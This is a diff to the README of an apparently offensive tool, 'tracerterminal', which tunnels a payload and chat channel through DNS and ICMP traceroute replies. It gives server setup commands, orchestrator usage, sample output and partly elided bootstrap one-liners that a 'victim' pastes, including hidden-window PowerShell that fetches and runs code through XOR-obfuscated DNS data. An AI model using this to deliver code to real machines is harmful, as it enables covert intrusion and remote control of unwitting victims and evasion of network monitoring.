@@ -87,14 +87,14 @@ Go to your domain registrar's DNS management panel and add two records. This del
 |------|------|-----|-------|
 | `lab` | NS | 30 min | `ns1.yourdomain.com` |
 
-**Example** using `mydomain.net` with server at `192.168.1.100`:
+**Example** using `example.com` with server at `203.0.113.50`:
 
 | Name | Type | TTL | Value |
 |------|------|-----|-------|
-| `ns1` | A | 30 min | `192.168.1.100` |
-| `lab` | NS | 30 min | `ns1.mydomain.net` |
+| `ns1` | A | 30 min | `203.0.113.50` |
+| `lab` | NS | 30 min | `ns1.example.com` |
 
-After this, any DNS query for `*.lab.mydomain.net` anywhere in the world will be routed to your server on port 53.
+After this, any DNS query for `*.lab.example.com` anywhere in the world will be routed to your server on port 53.
 
 **Registrar-specific notes:**
 - **Cloudflare**: The `ns1` A record must be "DNS Only" (grey cloud icon). Cloudflare's proxy does not forward port 53.
@@ -138,33 +138,45 @@ sudo iptables -A OUTPUT -p icmp --icmp-type echo-reply -j DROP
 
 If behind a home router, also port-forward UDP 53, TCP 53, and ICMP to your server's local IP.
 
-### Step 5: Start the Orchestrator
+### Step 5: Generate Client Scripts
 
-Run from the project root directory (`tracerterminal/`):
+The client scripts and bootstrap one-liners in `clients/` and `bootstrap/` are **templates** with `{{DOMAIN_ZONE}}`, `{{SERVER_IP}}`, etc. placeholders. Run the generator to stamp out working copies:
+
+```bash
+python generate.py
+# Or override config on the command line:
+python generate.py --domain lab.example.com --ip 203.0.113.50
+```
+
+This creates a `build/` folder with ready-to-use client scripts and bootstraps.
+
+### Step 6: Start the Orchestrator
+
+Run from the project root directory (`tracerterminal/`). Point `--payload` at the **generated** client, not the template:
 
 ```bash
 # Deliver the PowerShell chat client to Windows targets
-sudo python -m server.orchestrator --payload clients/chat_client.ps1
+sudo python -m server.orchestrator --payload build/clients/chat_client.ps1
 
 # Or the Bash client for Linux/macOS targets
-sudo python -m server.orchestrator --payload clients/chat_client.sh
+sudo python -m server.orchestrator --payload build/clients/chat_client.sh
 
 # Or the CMD batch client
-sudo python -m server.orchestrator --payload clients/chat_client.bat
+sudo python -m server.orchestrator --payload build/clients/chat_client.bat
 ```
 
 You can also override config values from the command line:
 
 ```bash
 sudo python -m server.orchestrator \
-  --payload clients/chat_client.ps1 \
-  --domain lab.mydomain.net \
-  --ip 192.168.1.100
+  --payload build/clients/chat_client.ps1 \
+  --domain lab.example.com \
+  --ip 203.0.113.50
 ```
 
 Root/admin is required for Scapy raw sockets and binding to port 53.
 
-### Step 6: Verify DNS Delegation
+### Step 7: Verify DNS Delegation
 
 From any external machine (not the server), run:
 
@@ -174,7 +186,7 @@ nslookup test.lab.yourdomain.com
 
 You should see the query arrive in the orchestrator's console output. If it does, the full NS delegation chain is working and the server is ready for clients.
 
-### Step 7: Send the Bootstrap to a Client
+### Step 8: Send the Bootstrap to a Client
 
 Give the target the appropriate one-liner from `bootstrap/`. See [clients/README.md](clients/README.md) for details on how each bootstrap and chat client works.
 
@@ -184,49 +196,49 @@ Give the target the appropriate one-liner from `bootstrap/`. See [clients/README
 
 ```
 [*] Tracer Terminal Orchestrator
-[*] Domain zone: lab.mydomain.net
-[*] Server IP / XOR key: 192.168.1.100 -> [96, 38, 118, 3]
-[*] Payload loaded: clients/chat_client.ps1 (1009 bytes)
-[*] Payload encoded into 9 data shards + end marker
+[*] Domain zone: lab.example.com
+[*] Server IP / XOR key: 203.0.113.50 -> [203, 0, 113, 50]
+[*] Payload loaded: build/clients/chat_client.ps1 (1009 bytes)
+[*] Payload encoded into 6 data shards + end marker
 [*] Server ready. Waiting for connections...
 [*] Commands: /list  /select <ip>  /quit
 
-[+] New client: 203.0.113.50
-[>] Delivering payload to 203.0.113.50 (9 shards)
+[+] New client: 198.51.100.25
+[>] Delivering payload to 198.51.100.25 (6 shards)
 
 server> /list
-  203.0.113.50  [CHATTING]  inbox:0  outbox:0
+  198.51.100.25  [CHATTING]  inbox:0  outbox:0
 
-server> /select 203.0.113.50
-[*] Selected: 203.0.113.50
+server> /select 198.51.100.25
+[*] Selected: 198.51.100.25
 
 server> Hello from the server!
-[*] Queued for 203.0.113.50 (will deliver on next rx poll)
+[*] Queued for 198.51.100.25 (will deliver on next rx poll)
 
-[203.0.113.50] Hi back!
+[198.51.100.25] Hi back!
 ```
 
 ### Client Side (Bootstrap)
 
-The victim pastes one of these commands. Each uses only built-in OS tools:
+The victim pastes one of the **generated** one-liners from `build/bootstrap/`. Each uses only built-in OS tools:
 
 **PowerShell** (copy-paste into PowerShell or Win+R):
 ```
-powershell -w h -nop -c "$z='lab.mydomain.net';$t=tracert payload.$z;..."
+powershell -w h -nop -c "$z='lab.example.com';$t=tracert payload.$z;..."
 ```
-(See `bootstrap/bootstrap_ps.txt` for the full command)
+(See `build/bootstrap/bootstrap_ps.txt` for the full command)
 
 **CMD** (copy-paste into cmd.exe):
 ```
-@tracert payload.lab.mydomain.net>%tmp%\tt.txt&powershell -nop -w h -c "..."
+@tracert payload.lab.example.com>%tmp%\tt.txt&powershell -nop -w h -c "..."
 ```
-(See `bootstrap/bootstrap_cmd.txt` for the full command)
+(See `build/bootstrap/bootstrap_cmd.txt` for the full command)
 
 **Bash** (copy-paste into terminal):
 ```bash
-z=lab.mydomain.net;t=$(traceroute payload.$z 2>&1);k=(192 168 1 100);...
+z=lab.example.com;t=$(traceroute payload.$z 2>&1);k=(203 0 113 50);...
 ```
-(See `bootstrap/bootstrap_bash.txt` for the full command)
+(See `build/bootstrap/bootstrap_bash.txt` for the full command)
 
 ### Chat Client (After Delivery)
 
@@ -268,7 +280,7 @@ Disconnected.
 ## Encryption
 
 - **Algorithm**: XOR with 4-byte repeating key
-- **Key source**: Server IP address octets (e.g., `192.168.1.100` = `[0x60, 0x26, 0x76, 0x03]`)
+- **Key source**: Server IP address octets (e.g., `203.0.113.50` = `[0xCB, 0x00, 0x71, 0x32]`)
 - **Encoding**: Hex (0-9, a-f) for DNS-safe transport
 - **Compression**: zlib applied before encryption for payload delivery
 
@@ -281,15 +293,18 @@ tracerterminal/
     dns_handler.py        # dnslib DNS server with subdomain command routing
     icmp_tunnel.py        # Scapy ICMP fake-hop factory
     shard_encoder.py      # Payload chunking, XOR crypto, hex encoding
-    config.py             # Domain, IP, capacity constants (auto-calculated)
-  clients/
-    chat_client.bat       # CMD chat client (1065 bytes)
-    chat_client.ps1       # PowerShell chat client (1009 bytes)
-    chat_client.sh        # Bash chat client (1126 bytes)
-  bootstrap/
-    bootstrap_cmd.txt     # CMD one-liner (432 bytes)
-    bootstrap_ps.txt      # PowerShell one-liner (446 bytes)
-    bootstrap_bash.txt    # Bash one-liner (288 bytes)
+    config.py             # Domain, IP, capacity constants -- EDIT THIS FIRST
+  clients/                # TEMPLATES with {{placeholders}}
+    chat_client.bat       # CMD chat client template
+    chat_client.ps1       # PowerShell chat client template
+    chat_client.sh        # Bash chat client template
+    README.md             # How the clients and protocol work
+  bootstrap/              # TEMPLATES with {{placeholders}}
+    bootstrap_cmd.txt     # CMD one-liner template
+    bootstrap_ps.txt      # PowerShell one-liner template
+    bootstrap_bash.txt    # Bash one-liner template
+  generate.py             # Stamps out working clients/bootstraps from templates + config
+  build/                  # Generated output (gitignored) -- use these files
   requirements.txt
   README.md
 ```
